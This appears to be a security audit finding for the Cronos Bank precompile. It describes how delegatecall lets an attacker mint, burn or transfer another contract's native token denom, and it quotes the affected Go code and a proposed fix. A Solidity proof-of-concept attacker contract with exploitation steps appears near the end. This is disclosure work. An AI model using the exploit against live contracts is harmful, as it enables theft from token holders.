### Title
`delegatecall` to Bank Precompile Allows Unauthorized Mint/Burn/Transfer of Any Contract's Native Token Denom - (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary

The Cronos Bank precompile (`0x64`) derives the native token denom for `mint`, `burn`, and `transfer` operations exclusively from `contract.Caller()`. Under EVM `delegatecall` semantics, `contract.Caller()` returns the *caller of the delegatecalling contract* (the outer frame's caller), not the delegatecalling contract itself. An attacker can exploit this by deploying a contract that `delegatecall`s the Bank precompile while being invoked by a legitimate token-owning contract (e.g., via a callback), causing the precompile to operate under the victim contract's denom without authorization.

### Finding Description

The Bank precompile's `Run` function determines the denom for `mint`, `burn`, and `transfer` using:

```go
denom := EVMDenom(contract.Caller())
``` [1](#0-0) [2](#0-1) 

`EVMDenom` produces the string `"evm/" + callerAddress.Hex()`: [3](#0-2) 

Under go-ethereum's `delegatecall` semantics, `contract.CallerAddress` is set to the *parent frame's caller* (i.e., whoever called the delegatecalling contract), not the delegatecalling contract's own address. This is implemented in go-ethereum's `Contract.AsDelegate()`:

```go
func (c *Contract) AsDelegate() *Contract {
    parent := c.caller.(*Contract)
    c.CallerAddress = parent.CallerAddress  // preserved from outer frame
    ...
}
```

**Attack scenario:**

1. Contract B is a legitimate token contract that has minted tokens under denom `evm/0x<ContractB>` using the Bank precompile. It also has a callback mechanism (e.g., a flash loan, swap hook, or any function that calls an external address supplied by the user).
2. Attacker deploys Contract A with a function that `delegatecall`s the Bank precompile's `mint(attacker, largeAmount)`.
3. Attacker calls Contract B's callback-accepting function, passing Contract A as the callback target.
4. Contract B calls Contract A (callback).
5. Contract A `delegatecall`s the Bank precompile.
6. Inside the Bank precompile's `Run`: `contract.Caller()` = Contract B (the caller of Contract A, preserved through `delegatecall`).
7. `denom = "evm/0x<ContractB>"` — the precompile mints tokens under Contract B's denom.

The same path applies to `burn` (destroying victim's holdings) and `transfer` (draining any holder's balance of Contract B's denom): [4](#0-3) [5](#0-4) 

There is no `delegatecall` guard anywhere in the Bank precompile's `Run` function, `RequiredGas`, or the `BaseContract` interface: [6](#0-5) 

### Impact Explanation

**Critical.** An unprivileged attacker can:

- **Mint** an unlimited supply of any contract's `evm/<address>` native token denom, inflating supply and stealing value from holders.
- **Burn** tokens from any address holding that denom, destroying user balances without consent.
- **Transfer** tokens from any holder to the attacker, constituting unauthorized theft.

This directly matches the Critical impact class: *unauthorized mint, burn, transfer for precompile-controlled assets*.

### Likelihood Explanation

Any contract that:
1. Uses the Bank precompile to manage its native token denom, **and**
2. Has any function that calls an external/user-supplied address (callbacks, flash loans, hooks, arbitrary `call` targets)

...is exploitable. This is a common pattern in DeFi contracts. The attacker needs no special privileges — only the ability to call the victim contract's callback-accepting function.

### Recommendation

Add a `delegatecall` guard at the entry point of the Bank precompile's `Run` function. The EVM provides `contract.Address()` (the execution context address) and the precompile's own canonical address. Under a `delegatecall`, `contract.Address()` will differ from `bc.Address()`. Reject such calls:

```go
func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
    // Reject delegatecall: execution context must equal the precompile's own address
    if contract.Address() != bc.Address() {
        return nil, errors.New("delegatecall to bank precompile is not allowed")
    }
    ...
}
```

Apply the same guard to the ICA precompile (`0x66`) and Relayer precompile (`0x65`), which also use `contract.Caller()` for owner/authority derivation: [7](#0-6) [8](#0-7) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
}

// Attacker contract
contract AttackerContract {
    address constant BANK_PRECOMPILE = 0x0000000000000000000000000000000000000064;

    // This function is called as a callback by VictimTokenContract
    function exploit(address mintTo, uint256 amount) external {
        // delegatecall to bank precompile
        // contract.Caller() inside bank precompile = VictimTokenContract (our caller)
        // denom = "evm/0x<VictimTokenContract>"
        (bool ok,) = BANK_PRECOMPILE.delegatecall(
            abi.encodeWithSignature("mint(address,uint256)", mintTo, amount)
        );
        require(ok, "delegatecall failed");
    }
}

// Victim: a legitimate token contract with a callback
interface IVictimTokenContract {
    // e.g., a flash loan or swap callback that calls an external address
    function flashLoan(address callback, uint256 amount) external;
}
```

**Steps:**
1. Deploy `AttackerContract`.
2. Call `VictimTokenContract.flashLoan(address(attackerContract), 0)`.
3. `VictimTokenContract` calls `attackerContract.exploit(attacker, 1_000_000e18)`.
4. `AttackerContract` `delegatecall`s Bank precompile `mint`.
5. Inside Bank precompile: `contract.Caller()` = `VictimTokenContract`.
6. `denom = "evm/0x<VictimTokenContract>"` — attacker receives 1,000,000 units of the victim's native token denom, minted from thin air.

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L56-58)
```go
func EVMDenom(token common.Address) string {
	return EVMDenomPrefix + token.Hex()
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L113-156)
```go
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/base_contract.go (L1-26)
```go
package precompiles

import (
	"github.com/ethereum/go-ethereum/common"
)

type Registrable interface {
	RegistryKey() common.Address
}

type BaseContract interface {
	Registrable
}

type baseContract struct {
	address common.Address
}

func NewBaseContract(address common.Address) BaseContract {
	return &baseContract{
		address: address,
	}
}

func (c *baseContract) RegistryKey() common.Address {
	return c.address
```

**File:** x/cronos/keeper/precompiles/ica.go (L135-136)
```go
	caller := contract.Caller()
	owner := sdk.AccAddress(caller.Bytes()).String()
```

**File:** x/cronos/keeper/precompiles/relayer.go (L221-228)
```go
	e := &Executor{
		cdc:       bc.cdc,
		stateDB:   stateDB,
		caller:    contract.Caller(),
		contract:  precompileAddr,
		input:     input,
		converter: converter,
	}
```
